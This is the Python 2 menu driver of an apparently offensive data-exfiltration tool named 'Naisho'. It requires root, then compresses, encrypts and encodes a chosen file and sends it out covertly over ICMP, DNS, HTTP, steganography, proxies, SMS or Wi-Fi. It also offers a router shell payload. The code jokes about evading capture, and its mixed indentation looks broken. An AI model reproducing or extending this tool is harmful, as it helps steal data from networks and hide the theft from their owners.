#!/usr/bin/python	
from mods.naishoEncryption import *
from mods.naishoEncoding import *
from mods.naishoExfiltration import *
from mods.naishoMisc import *
from mods.naishoCompression import *
from mods.naishoReporting import *
from ui.ui import *
import os


if __name__ == "__main__":
	banner1()
	if os.geteuid() == 0:
		soptions = raw_input("[1] Exfiltrate data (Network N1njA)\n[2] 3nc0d3r shells\n\nNaisho> ")
		if soptions == str(301):
			banner1()
			soptions = raw_input("[1] Sniff traffic\n[2] Traceroute\n\nNaisho:Intel> ")
			intel = naishomisc()
			if soptions == str(1):
				intel.naishosniff()
			elif soptions == str(2):
				intel.naishotraceroute()	
			else:
				sys.exit(1)
		elif soptions == str(300):
				pass
		elif soptions == str(1):
			file = ""
			while len(file) == 0:
				banner1()
				try:
					filename = raw_input("\nProvide Filename location: ")
					file = open(filename).read()
				except:
					print "File Not Found!!! "
					raw_input("Press Enter to continue...")
        #--------------------------------------------|
        #               Compression                  |
        #--------------------------------------------|------------------------------------------------------------------------------------------------
                        compression = naishocompression(file)
                        cho = 0
                        while str(cho) != "":
                                banner1()
                                cho = raw_input("\033[038mWhat type of compression will you use?\033[0m\n\n\033[038m[1] bz2 compression\n[2] zlib compression\n[0] Show Data\n\nNaisho:Compression> ")
                                if cho == str(1):
                                        compression.naishobz2com()
                                elif cho == str(2):
                                        compression.naishozlibcom()
                                elif cho == str(0):
                                        compression.naishoshowdata()
                                else:
                                        pass

        #--------------------------------------------|
        #               Encryption                   |
        #--------------------------------------------|------------------------------------------------------------------------------------------------
			encrypt = naishoencryption(compression.message)
			cho = 0
			#while str(cho) != "":
			banner1()
			cho = raw_input("\033[038m\nWhat type of encryption will you use?\033[0m\n\n\033[038m[1] RSA (Excellent - Data will not be recovered)\n[2] BlowFish (Great - keep you key close)\n[3] AES (Great - keep your key close)\n[4] No Encryption (If you get caught not my fault!!!)\033[0m\n\nNaisho:Encryption> ")
			#encrypt = naishoencryption(file)

			if cho == str(1):
				encrypt.naishorsa()
			elif cho == str(2):
				encrypt.naishoblowfish()
			elif cho == str(3):
				encrypt.naishoaes()
			else:
				pass
        #--------------------------------------------|
        #               Encoding                     |
        #--------------------------------------------|------------------------------------------------------------------------------------------------
			encode = naishoencoding(encrypt.message)
			cho = 0
			while str(cho) != "":
				banner1()
				cho = raw_input("\033[038mWhat type of encoding will you use?\033[0m\n\n\033[038m[1] HEX\n[2] Base64\n[3] Base32\n[4] Base16\n[5] Ceaser Cipher\n[6] ROT-13\n[7] bz2 compression\n[8] zlib compression\n[9] utf-8\n[0] Show Data\n\nNaisho:Encoding> ")
				if cho == str(1):
					encode.naishohex()
                		elif cho == str(2):
                        		encode.naishobase64()
                		elif cho == str(3):
                        		encode.naishobase32()
				elif cho == str(4):
                                        encode.naishobase16()
				elif cho == str(5):
                                        encode.naishoceaser()
				elif cho == str(6):
					encode.naishorot13()
				elif cho == str(7):
					encode.naishobz2com()
				elif cho == str(8):
					encode.naishozlibcom()
				elif cho == str(9):
					encode.naishoutf8()
				elif cho == str(0):
                                        encode.naishoshowdata()
				else:   
                        		pass

        #--------------------------------------------|
        #               Exfiltration                 |
        #--------------------------------------------|------------------------------------------------------------------------------------------------
			exfiltration = naishoexfiltration(encode.message)
			banner1()	
			cho = raw_input("[1] FAST - Run through all network test\n[2] Manuel Exfiltration * Default\n\nNaisho:Exfiltration> ")
			if cho == str(1):
				banner1()
				cho = raw_input("[1] Create Configuration file\n[2] Use Existing configuration file\n\nNaisho:Exfiltration:FAST> ")
			elif cho == str(2) or cho == "":
				cho = 0
				while str(cho) != str("exit"):
					banner1()
					cho = raw_input("\033[31mPlease Choose Wisely:\033[0m\n\033[38m[1] ICMP (HEX)\n[2] DNS\n[3] HTTP\n[4] Stegonography (Password)\n[5] Stegonography (No Password)\n[6] Proxy Gateway\n[7] Ouput to file\n[8] SMS Text message\n[9] Wifi-Exfiltration\n[10] Export Report\n[0] Show Data\n\nNaisho:Exfiltration> ")
				
					if cho == str(1):
                               			exfiltration.naishoicmp()
                        		elif cho == str(2):
						exfiltration.naishodns()
                        		elif cho == str(3):
						exfiltration.naishohttp()
					elif cho == str(4):
						exfiltration.naishosteghide()
					elif cho == str(5):
						exfiltration.naishostepic()
					elif cho == str(6):
						exfiltration.naishohttpproxy()
					elif cho == str(7):
						exfiltration.naishoexport()
					elif cho == str(8):
						exfiltration.naishotextmessage()
					elif cho == str(9):
						exfiltration.naishowifi()
					elif cho == str(0):
						exfiltration.naishoshowdata()
					elif cho == str(10):
						reporting = naishoreporting(exfiltration.message, exfiltration.reporting)
						reporting.naishoexporthtml()
                        		else:
						pass
        #--------------------------------------------|
        #               Reporting                    |
        #--------------------------------------------|------------------------------------------------------------------------------------------------
                        		#reporting = naishoreporting(exfiltration.message)

				
                                	
	#--------------------------------------------|
        #               Forensics                    |
        #--------------------------------------------|------------------------------------------------------------------------------------------------

		elif soptions == str(2):
			shell = naishomisc()
			shell.naishoroutershellpayload()
		else:
			print "\n[-] You did not select a correct code!!"	
	else:
		print "You are not running as root!!!\n\n"
    		sys.exit(1)
